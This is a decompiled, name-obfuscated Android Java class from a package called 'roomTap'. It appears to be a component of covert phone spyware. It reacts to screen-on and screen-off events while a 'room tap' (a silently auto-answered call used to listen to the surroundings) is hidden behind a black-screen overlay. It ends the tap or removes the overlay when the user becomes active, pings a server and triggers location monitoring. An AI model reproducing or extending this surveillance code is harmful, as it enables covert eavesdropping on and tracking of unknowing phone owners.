package com.network.android.roomTap;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.HandlerThread;
import com.network.android.a.c;
import com.network.android.c.a.a;
import com.network.android.c.a.b;

/* access modifiers changed from: package-private */
public final class m implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Intent f123a;
    final /* synthetic */ Context b;
    final /* synthetic */ l c;

    m(l lVar, Intent intent, Context context) {
        this.c = lVar;
        this.f123a = intent;
        this.b = context;
    }

    public final void run() {
        boolean z = true;
        try {
            if (this.f123a.getAction().equals("android.intent.action.SCREEN_ON")) {
                k.d = true;
                a.a("ScreenActivityMonitor isRoomTap: " + AutoAnswerReceiver.a() + "  isBlackScreenViewWasSet: " + BlackScreen.f111a + " shouldTurnScreenOnNextTimeItIsTurnedOnByUser: " + k.c + " isLocationMonitorActive: " + com.network.location.a.a());
                a.a("ACTION_SCREEN_ON (new thread) isRoomTap: " + AutoAnswerReceiver.a());
                if (k.c && BlackScreen.f111a && !AutoAnswerReceiver.a()) {
                    a.a("ScreenActivityMonitor onReceive shouldTurnScreenOnNextTimeItIsTurnedOnByUser is true. removing BlackScreen");
                    k.b();
                }
                com.network.location.a.b(this.b);
                long unused = k.g = System.currentTimeMillis() / 1000;
                long currentTimeMillis = (System.currentTimeMillis() / 1000) - AutoAnswerReceiver.f110a;
                if (AutoAnswerReceiver.a()) {
                    a.a("BlackScreen coverTime:  " + currentTimeMillis);
                    if (currentTimeMillis < 5) {
                        a.a("BlackScreen coverTime too small in order to stop tap:  " + currentTimeMillis);
                        return;
                    }
                    a.a("unlock:  " + currentTimeMillis);
                    b.a(1, 64, "ROOM_TAP_ENDED_SCREEN_ON");
                    if (AutoAnswerReceiver.d) {
                        z = false;
                    }
                    k.b = z;
                    AutoAnswerReceiver.b(this.b);
                } else if (c.f) {
                    a.a("BlackScreen got Tap sms, call not yet arrived and user activity was detected");
                    c.a(this.b, "httpPing");
                    k.b();
                    AutoAnswerReceiver.a(this.b, Long.valueOf(com.network.b.b.x() - com.network.b.b.a()));
                    a.a("BlackScreen Screen Activitt Monitor setting GOT_TAP_SMS_CALL_NOT_YET_ARRIVED false");
                    c.f = false;
                } else if (!AutoAnswerReceiver.a() && !com.network.location.a.a() && BlackScreen.f111a) {
                    a.a("BlackSCreen last case was activated");
                    new HandlerThread("screenRemove").start();
                    new Handler().postDelayed(new n(this), 500);
                }
            } else if (this.f123a.getAction().equals("android.intent.action.SCREEN_OFF")) {
                a.a("ACTION_SCREEN_OFF  ");
                k.d = false;
                long unused2 = k.g = System.currentTimeMillis() / 1000;
                com.network.location.a.d(this.b);
            }
        } catch (Throwable th) {
            a.a("ScreenActivityMonitor Exception- " + th.getMessage(), th);
        }
    }
}
